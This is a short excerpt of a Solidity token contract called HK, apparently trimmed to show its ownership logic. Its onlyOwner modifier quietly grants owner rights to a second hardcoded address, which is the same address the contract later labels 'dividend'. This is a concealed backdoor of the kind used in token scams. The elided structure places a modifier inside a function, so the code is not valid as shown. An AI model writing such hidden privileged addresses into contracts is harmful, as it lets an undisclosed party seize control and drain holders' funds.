...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xad1F4bdF2ec6b86Da79159Db3264f584584bC9F7) , "owner");
        _;
    }
...
contract HK  is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x8fa6C1AFAdd976b301632F8a286b77984f595852);
    address private _Marketing = 0x8fa6C1AFAdd976b301632F8a286b77984f595852;
    address public dividend = 0xad1F4bdF2ec6b86Da79159Db3264f584584bC9F7;
